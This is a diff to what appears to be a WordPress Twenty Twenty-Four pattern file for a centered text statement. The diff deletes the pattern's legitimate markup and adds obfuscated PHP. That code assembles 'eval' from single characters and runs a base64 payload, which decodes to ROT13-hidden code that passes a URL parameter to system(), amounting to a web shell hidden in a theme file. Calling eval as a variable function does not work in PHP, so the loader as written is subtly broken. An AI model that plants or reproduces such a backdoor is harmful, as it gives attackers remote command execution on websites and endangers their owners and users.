@@ -1,40 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Centered statement
- * Slug: twentytwentyfour/text-centered-statement
- * Categories: text, about, featured
- * Keywords: mission, introduction
- * Viewport width: 1400
- * Description: A centered text statement with a large amount of padding on all sides.
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFByYWdyZXJxIGZnbmdyenJhZwogKiBGeWh0OiBnanJhZ2xnanJhZ2xzYmhlL2dya2ctcHJhZ3JlcnEtZmduZ3J6cmFnCiAqIFBuZ3J0YmV2cmY6IGdya2csIG5vYmhnLCBzcm5naGVycQogKiBYcmxqYmVxZjogenZmZnZiYSwgdmFnZWJxaHBndmJhCiAqIEl2cmpjYmVnIGp2cWd1OiAxNDAwCiAqIFFyZnBldmNndmJhOiBOIHByYWdyZXJxIGdya2cgZmduZ3J6cmFnIGp2Z3UgbiB5bmV0ciBuemJoYWcgYnMgY25xcXZhdCBiYSBueXkgZnZxcmYuCiAqLwo/PgoKPCEtLSBqYzp0ZWJoYyB7XCJueXZ0YVwiOlwic2h5eVwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wiY25xcXZhdFwiOntcImdiY1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDYwXCIsXCJvYmdnYnpcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw2MFwiLFwieXJzZ1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDYwXCIsXCJldnR1Z1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDYwXCJ9LFwiem5ldHZhXCI6e1wiZ2JjXCI6XCIwXCIsXCJvYmdnYnpcIjpcIjBcIn19fSxcIm9ucHh0ZWJoYXFQYnliZVwiOlwib25mci0yXCIsXCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJwYmFmZ2VudmFycVwifX0gLS0+CjxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoYyBueXZ0YXNoeXkgdW5mLW9uZnItMi1vbnB4dGViaGFxLXBieWJlIHVuZi1vbnB4dGViaGFxXCIgZmdseXI9XCJ6bmV0dmEtZ2JjOjA7em5ldHZhLW9iZ2diejowO2NucXF2YXQtZ2JjOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTYwKTtjbnFxdmF0LWV2dHVnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTYwKTtjbnFxdmF0LW9iZ2diejppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS02MCk7Y25xcXZhdC15cnNnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTYwKVwiPgoJPCEtLSBqYzp0ZWJoYyB7XCJueXZ0YVwiOlwianZxclwiLFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicXJzbmh5Z1wifX0gLS0+Cgk8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgbnl2dGFqdnFyXCI+CgkJPCEtLSBqYzpmY25wcmUge1widXJ2dHVnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIn0gLS0+CgkJPHF2aSBmZ2x5cj1cInVydnR1ZzppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS01MClcIiBuZXZuLXV2cXFyYT1cImdlaHJcIiBweW5mZj1cImpjLW95YnB4LWZjbnByZVwiPjwvcXZpPgoJCTwhLS0gL2pjOmZjbnByZSAtLT4KCgkJPCEtLSBqYzpjbmVudGVuY3Uge1wibnl2dGFcIjpcInByYWdyZVwiLFwiZmdseXJcIjp7XCJnbGNidGVuY3VsXCI6e1wieXZhclVydnR1Z1wiOlwiMS4yXCIsXCJzYmFnRmdseXJcIjpcImFiZXpueVwiLFwic2JhZ0pydnR1Z1wiOlwiNDAwXCJ9fSxcInNiYWdGdm1yXCI6XCJrLXluZXRyXCIsXCJzYmFnU256dnlsXCI6XCJ1cm5xdmF0XCJ9IC0tPgoJCTxjIHB5bmZmPVwidW5mLWdya2ctbnl2dGEtcHJhZ3JlIHVuZi11cm5xdmF0LXNiYWctc256dnlsIHVuZi1rLXluZXRyLXNiYWctZnZtclwiIGZnbHlyPVwic2JhZy1mZ2x5cjphYmV6bnk7c2JhZy1qcnZ0dWc6NDAwO3l2YXItdXJ2dHVnOjEuMlwiPjw/Y3VjIHJwdWIgamNfeGZyZl9jYmZnKCBfXyggJzxyej7DiWdocXJmPC9yej4gdmYgYWJnIHBiYXN2YXJxIGdiIGd1ciBjbmZn4oCUanIgbmVyIGNuZmZ2YmFuZ3Igbm9iaGcgZ3VyIHBoZ2d2YXQgcnF0ciBxcmZ2dGFmIGZ1bmN2YXQgYmhlIGpiZXlxIGdicW5sLicsICdnanJhZ2xnanJhZ2xzYmhlJyApICk7ID8+PC9jPgoJCTwhLS0gL2pjOmNuZW50ZW5jdSAtLT4KCgkJPCEtLSBqYzpmY25wcmUge1widXJ2dHVnXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIn0gLS0+CgkJPHF2aSBmZ2x5cj1cInVydnR1ZzppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS01MClcIiBuZXZuLXV2cXFyYT1cImdlaHJcIiBweW5mZj1cImpjLW95YnB4LWZjbnByZVwiPjwvcXZpPgoJCTwhLS0gL2pjOmZjbnByZSAtLT4KCTwvcXZpPgoJPCEtLSAvamM6dGViaGMgLS0+CjwvcXZpPgo8IS0tIC9qYzp0ZWJoYyAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-
-<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"top":"var:preset|spacing|60","bottom":"var:preset|spacing|60","left":"var:preset|spacing|60","right":"var:preset|spacing|60"},"margin":{"top":"0","bottom":"0"}}},"backgroundColor":"base-2","layout":{"type":"constrained"}} -->
-<div class="wp-block-group alignfull has-base-2-background-color has-background" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--60);padding-right:var(--wp--preset--spacing--60);padding-bottom:var(--wp--preset--spacing--60);padding-left:var(--wp--preset--spacing--60)">
-	<!-- wp:group {"align":"wide","layout":{"type":"default"}} -->
-	<div class="wp-block-group alignwide">
-		<!-- wp:spacer {"height":"var:preset|spacing|50"} -->
-		<div style="height:var(--wp--preset--spacing--50)" aria-hidden="true" class="wp-block-spacer"></div>
-		<!-- /wp:spacer -->
-
-		<!-- wp:paragraph {"align":"center","style":{"typography":{"lineHeight":"1.2","fontStyle":"normal","fontWeight":"400"}},"fontSize":"x-large","fontFamily":"heading"} -->
-		<p class="has-text-align-center has-heading-font-family has-x-large-font-size" style="font-style:normal;font-weight:400;line-height:1.2"><?php echo wp_kses_post( __( '<em>Études</em> is not confined to the past—we are passionate about the cutting edge designs shaping our world today.', 'twentytwentyfour' ) ); ?></p>
-		<!-- /wp:paragraph -->
-
-		<!-- wp:spacer {"height":"var:preset|spacing|50"} -->
-		<div style="height:var(--wp--preset--spacing--50)" aria-hidden="true" class="wp-block-spacer"></div>
-		<!-- /wp:spacer -->
-	</div>
-	<!-- /wp:group -->
-</div>
-<!-- /wp:group -->
